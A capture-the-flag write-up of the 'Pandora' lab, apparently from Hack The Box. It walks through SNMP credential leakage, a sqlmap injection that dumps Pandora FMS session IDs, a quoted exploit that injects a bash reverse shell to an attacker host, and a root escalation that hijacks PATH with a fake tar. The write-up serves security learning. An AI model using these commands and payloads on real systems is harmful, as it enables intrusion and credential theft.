## Pandora

### Lab Details 

- Difficulty: Easy
- Type: Web App, SNMP, Pandora FMS, SQLi, Priv Esc, Unix

#### Tasks
Q1: Which UDP port number does snmpwalk run on?
 - snmpwalk runs on UDP ports
 - need to perform scans on UDP ports
 - nmap -sU -T4 -vv --top-ports 100 -Pn -oA Pandora 10.10.11.136
```
<snip>
PORT      STATE         SERVICE  REASON
161/udp   open          snmp     udp-response ttl 63
518/udp   open|filtered ntalk    no-response
998/udp   open|filtered puparp   no-response
1433/udp  open|filtered ms-sql-s no-response
1812/udp  open|filtered radius   no-response
1900/udp  open|filtered upnp     no-response
49188/udp open|filtered unknown  no-response
<snip>
```

Q2: What is the name of the product being showcased on the website which we land on, upon visiting the IP address of the remote host in the browser?
- check by visiting the site
- website name is `Play`
```
$: curl 10.10.11.136
<snip>
<meta name="title" content="Play - Free Open Source HTML Bootstrap Template by UIdeck">
<snip>
```

Q3: For which user are the cleartext credentials revealed in SNMP enumeration?
- run snmapwalk to obtain info over SNMP
```
<snip>
$: snmpwalk -v 2c -c public 10.10.11.136       
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (10752994) 1 day, 5:52:09.94
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
<snip>
iso.3.6.1.2.1.25.4.2.1.5.1107 = STRING: "-u daniel -p HotelBabylon23"
```
Q4: Which service can be used to login into the box using the obtained credentials?
- run scan on TCP ports
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
```

Q5:Which other user has a home directory on the box?
```
daniel@pandora:~$ ls /home
daniel  matt
```

Q6: In the server web directory, which folder exists other than the default html folder?
 - we can check the folder in `/var/www/`
```
daniel@pandora:~$ ls /var/www
html  pandora
```

Q7: What is the flag given to SSH to forward a port from the connecting host to another host/port through the SSH connection?
- based on the man page of ssh `-L` is enables port foward
```
<snip>
       -L [bind_address:]port:host:hostport
       -L [bind_address:]port:remote_socket
       -L local_socket:host:hostport
       -L local_socket:remote_socket
</snip>
```
- below binds local port 4444 to remote port 80 on target
```
 $: ssh -L 4444:localhost:80 daniel@10.10.11.136
```
Q8: What is the version of the Pandora FMS accessible via the tunnel?
- version info is located at the bottom of the page `v7.0NG.742_FIX_PERL2020`

Q9: Which endpoint of this version of Pandora is vulnerable to SQL injection?
- according to blog post `https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/`
- the vulnerability exists at `/include/chart_generator.php`

Q10: There exist at least two vulnerabilities in Pandora that can lead to remote code execution. We'll focus on CVE-2020-13851. Which HTTP POST parameter of the vulnerable request body is vulnerable to command injection?
- POC for SQLi `https://github.com/hadrian3689/pandorafms_7.44/blob/master/pandorafms_7.44.py`
- function exploit contains a dictionary var called exploit_data and target entry is injecting a reverse shell
```
    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("Sending payload:")
        exploit_url = self.url + "/pandora_console/ajax.php"

        exploit_data = {
            "page":"include/ajax/events",
            "perform_event_response":"10000000",
            "target":'bash -c "bash -i >& /dev/tcp/'+ self.lhost + '/' + self.lport + ' 0>&1"',
            "response_id":"1"
        }

        if args.c:
            headers = {
                "Cookie": "PHPSESSID=" + self.cookie
            }
            requests.post(exploit_url,data=exploit_data,headers=headers)
        else:
            self.session.post(exploit_url,data=exploit_data)
```
Q11: Submit the flag located in the matt user's home directory.
- in order for the POC to work, we must have either have username and password or session id 
- tried many username and password no luck 
- we can use the SQLi to dump session id in the database end use the POC to obtain a reverse shell
```
## 1. retrieve session id
## port is the port forwared using SSH -L 
$: sqlmap --url="http://localhost:4444/pandora_console/include/chart_generator.php?session_id=''" -D pandora -T tsessions_php --dump 
<snip>
[04:51:21] [INFO] fetching columns for table 'tsessions_php' in database 'pandora'
[04:51:21] [INFO] resumed: 'id_session'
[04:51:21] [INFO] resumed: 'char(52)'
[04:51:21] [INFO] resumed: 'last_active'
[04:51:21] [INFO] resumed: 'int(11)'
[04:51:21] [INFO] resumed: 'data'
[04:51:21] [INFO] resumed: 'text'
[04:51:21] [INFO] fetching entries for table 'tsessions_php' in database 'pandora'
Database: pandora
Table: tsessions_php
[54 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 370dg6924r6p5vdhv0o5ho4q89 | id_usuario|s:6:"daniel";                            | 1750256612  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 3tq87684i8j8vl0hdegst9rtkc | NULL                                                | 1750256851  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 6r9f53f9er45h5i7nbenhahc5m | NULL                                                | 1750256683  |
| 7qk4kci44q7auomm0hlfg1p49u | NULL                                                | 1750254250  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 92ieasfvl4itrj2s6tsc84uqv9 | NULL                                                | 1750254328  |
| 9vb1panfn3godbr1qdje903tsa | NULL                                                | 1750255979  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| bi8tnkqj87tmv979664tbp7nu4 | NULL                                                | 1750256906  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| d8bf4md7min3ve4trfjg4s5n6b | id_usuario|s:6:"daniel";                            | 1750256522  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| j8ju$sksb981l77c06q4v957   | id_usuario|s:6:"daniel";                            | 1750139663  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| n2n4dbefru76kkufv5hfn0hkv9 | NULL                                                | 1750256164  |
| n67j0m91ph3nsmltl3k20h8gdp | NULL                                                | 1750256856  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| nhclj0u2bghf6tu50c2jfgha3r | NULL                                                | 1750256674  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| o627fgkh6j01vdisj1392et24p | NULL                                                | 1750254848  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| op3jfvfh19v1b37op6a4kqau07 | NULL                                                | 1750256868  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qbn5u795rjqqoi8vmv0n74sapu | id_usuario|s:5:"admin";                             | 1750256081  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+----------------------------+-----------------------------------------------------+-------------+
<snip>


## 2. run python POC 
## session id is matt's 
$ python3 pandorafms_7.44.py -t http://localhost:4444/ -c g4e01qdgk36mfdh90hvcc54umq  -lhost 10.10.14.35 -lport 9000

## set up nc listern on localhost 
```

Q12: What is the filename of the unusual binary having SUID permission on the remote host?
- transferred linpeas.sh over to target
- therer is a binary called pandora_backup that looks interesting 
```
                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                             
                               ╚═══════════════════╝                                                                                                                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                
strings Not Found                                                                                                                                                                               
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                           
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup (Unknown SUID binary!)
```
Q13: Which specific command-line utility is used in the above binary file to generate a backup in the form of a tar.gz file?
- we can use `strings` to get readable strings in a binary file 
- `strings` does not exist on target so we have to transfer the binary to local 
```
## on receiver
nc -l -p 1234 > received_file

## on attacker
nc <receiver_ip> 1234 < file_to_send

## run strings on binary
$ strings pandora_backup 
/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
getuid@GLIBC_2.2.5
system@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
setreuid@GLIBC_2.2.5
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

```
 


Q14: Is the absolute path of the above command-line utility specified inside the binary file?
- the binary is running tar to perform archiving, however the tar is not run as absolute path
```

tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```

Q15: Which environment variable contains a list of directories which are searched for the binary that is being run without specifying its absolute path?

- `$PATH` contains list of directories that shell looks for to find binary to execute

Q16: Submit the flag located in root's home directory.
- since tar is not called from the absolute path, we can hijack PATH and inject a custom `tar` command to PATH
- however do need to gain a valid ssh session on target else the attack wont work
```
# 1. generate ssh key 

$ ssh-keygen 
id_ed25519 id_ed25519.pub

# 2. send to target 
## on target 
$: mkdir /home/matt/.ssh

$: wget https://10.10.14.35:8000/id_ed25519.pub -O /home/matt/.ssh/authorized_keys

# 3. connect via ssh 
$: ssh -r ./id_ed25519  matt@10.10.11.136

# 4. create a malicious tar 
$: echo -e '#!/bin/bash \nbash' > /tmp/tar
$: chmod +x /tmp/tar
$: export PATH=/tmp:$PATH


# 5. run vulnerable binary 
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# 
```

#### Resources

#### Lesson Learned
- if privilege escalation requires a new shell to be created, try creating a new pair of ssh keys and place pub key to target and get a valid ssh session.
